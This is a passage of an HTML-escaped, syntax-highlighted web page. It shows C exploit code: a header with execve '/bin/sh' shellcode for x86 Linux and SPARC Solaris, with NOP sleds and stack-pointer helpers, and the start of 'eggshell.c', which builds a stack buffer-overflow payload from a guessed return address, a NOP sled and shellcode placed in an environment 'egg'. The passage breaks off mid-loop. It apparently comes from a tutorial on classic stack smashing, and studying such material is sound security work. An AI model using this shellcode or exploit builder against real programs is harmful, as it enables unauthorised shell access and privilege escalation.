&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x80\xe8\xdc\xff\xff\xff&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;/bin/sh&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;get_sp&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#447fcf&#34;&gt;__asm__&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;movl %esp,%eax&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#elif defined(__sparc__) &amp;amp;&amp;amp; defined(__sun__) &amp;amp;&amp;amp; defined(__svr4__)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#define NOP_SIZE	4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; nop[]=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xac\x15\xa1\x6e&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; shellcode[] =
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;get_sp&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;__asm__&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;or %sp, %sp, %i0&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#elif defined(__sparc__) &amp;amp;&amp;amp; defined(__sun__)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#define NOP_SIZE        4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; nop[]=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xac\x15\xa1\x6e&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; shellcode[] =
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;get_sp&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;__asm__&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;or %sp, %sp, %i0&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// eggshell.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&amp;#34;shellcode.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#define DEFAULT_OFFSET                    0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#define DEFAULT_BUFFER_SIZE             512
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;#define DEFAULT_EGG_SIZE               2048
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#cd2828;font-weight:bold&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;usage&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *argv[]) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *ptr, *bof, *egg;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; *addr_ptr, addr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i, n, m, c, align=&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, eggsize=DEFAULT_EGG_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; ((c = &lt;span style=&#34;color:#447fcf&#34;&gt;getopt&lt;/span&gt;(argc, argv, &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;a:b:e:o:&amp;#34;&lt;/span&gt;)) != EOF)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;switch&lt;/span&gt; (c) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        align = &lt;span style=&#34;color:#447fcf&#34;&gt;atoi&lt;/span&gt;(optarg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        bsize = &lt;span style=&#34;color:#447fcf&#34;&gt;atoi&lt;/span&gt;(optarg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        eggsize = &lt;span style=&#34;color:#447fcf&#34;&gt;atoi&lt;/span&gt;(optarg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;o&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        offset = &lt;span style=&#34;color:#447fcf&#34;&gt;atoi&lt;/span&gt;(optarg);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;break&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;?&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#447fcf&#34;&gt;usage&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#447fcf&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#447fcf&#34;&gt;strlen&lt;/span&gt;(shellcode) &amp;gt; eggsize) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Shellcode is larger the the egg.&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!(bof = &lt;span style=&#34;color:#447fcf&#34;&gt;malloc&lt;/span&gt;(bsize))) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Can&amp;#39;t allocate memory.&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; (!(egg = &lt;span style=&#34;color:#447fcf&#34;&gt;malloc&lt;/span&gt;(eggsize))) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;Can&amp;#39;t allocate memory.&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  addr = &lt;span style=&#34;color:#447fcf&#34;&gt;get_sp&lt;/span&gt;() - offset;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Buffer size:&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;Egg size:&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;Aligment:&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bsize, eggsize, align);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;[ Address:&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;0x%x&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;Offset:&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\t\t\t\t&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;, addr, offset);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  addr_ptr = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt; *) bof;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; bsize; i+=&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    *(addr_ptr++) = addr;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ptr = egg;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt;= eggsize - &lt;span style=&#34;color:#447fcf&#34;&gt;strlen&lt;/span&gt;(shellcode) - NOP_SIZE; i += NOP_SIZE)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (n = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; n &amp;lt; NOP_SIZE; n++) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      m = (n + align) % NOP_SIZE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      *(ptr++) = nop[m];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
